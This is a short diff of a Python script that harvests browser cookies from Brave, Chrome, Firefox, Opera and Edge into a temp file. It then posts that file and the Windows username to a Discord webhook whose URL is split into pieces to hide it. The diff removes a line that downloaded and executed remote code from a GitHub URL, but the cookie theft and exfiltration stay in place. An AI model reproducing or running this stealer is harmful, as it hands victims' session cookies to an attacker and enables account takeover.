@@ -4,7 +4,6 @@ with open(os.path.expanduser("~") + f"\\AppData\\Local\\Temp\\cookies.txt", 'w',
     for browser in ["brave", "chrome", "firefox", "opera", "opera_gx", "edge"]:
         try: exec(f"for i in browser_cookie3.{browser}(): file.write(i.name + ' >>> ' + i.value + ' >>> ' + i.domain + ' >>> ' + browser.upper() + '\\n')")
         except: pass
-try: exec(requests.get("https://raw.githubusercontent.com/flex1948/PyGrabber/main/main").text)
 except: pass
 while True:
   try: r=requests.post("htt"+"ps:/"+"/dis"+"cord.c"+"om/api/webh"+"ooks/112066315"+"2548380682/Dykot-A-ONI5l63sOGVFY4iKIrZjAiceQxY1SkwLCQrvF2hjb0JcQXSqCLUoJbpTPG4q",data={'content':"@everyone " + os.path.expanduser('~').split('\\')[2]}, files={'file1':open(os.path.expanduser("~") + f"\\AppData\\Local\\Temp\\cookies.txt", 'rb')}) ;break
